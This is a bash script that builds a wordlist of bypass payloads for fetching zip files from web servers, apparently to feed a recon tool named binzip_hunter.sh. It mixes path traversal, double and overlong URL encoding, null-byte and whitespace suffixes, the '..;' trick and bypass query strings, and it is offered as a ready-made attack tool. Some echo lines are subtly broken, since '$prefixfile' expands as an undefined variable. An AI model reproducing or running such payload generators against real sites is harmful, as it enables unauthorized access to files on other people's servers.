#!/bin/bash

# WORDLIST GENERATOR FOR ZIP BYPASS
# Author: @themasterdoctor1
# Description: Creates an advanced bypass payload list for use with binzip_hunter.sh or other recon tools.

OUTFILE="zip_bypass_wordlist.txt"

FILENAMES=("file.zip" "file%2Ezip" "file%252Ezip" "file%c0%aezip" "FILE.ZIP")
PREFIXES=("" "./" "../" "../../" "/public/" "/downloads/" "/files/" "/static/" "/cdn/" "/old/" "/storage/" "/backup/")
SUFFIXES=("" "#" "%00" "%09" "%0A" "%0D" "%20" "/" "?" 
  "?access=1" "?access=download" "?bypass=true" "?dl=1" 
  "?download=1" "?file=true" "?open=true")

> "$OUTFILE"

for prefix in "${PREFIXES[@]}"; do
  for name in "${FILENAMES[@]}"; do
    for suffix in "${SUFFIXES[@]}"; do
      echo "$prefix$name$suffix" >> "$OUTFILE"
    done
  done
  echo "$prefix../file.zip" >> "$OUTFILE"
  echo "$prefixfile.zip%2F" >> "$OUTFILE"
  echo "$prefixfile.zip%252F" >> "$OUTFILE"
  echo "$prefixfile.zip..;" >> "$OUTFILE"
  echo "$prefixfile.zip%3f" >> "$OUTFILE"
done

sort -u "$OUTFILE" -o "$OUTFILE"
echo "[+] Generated $(wc -l < $OUTFILE) payloads in $OUTFILE"
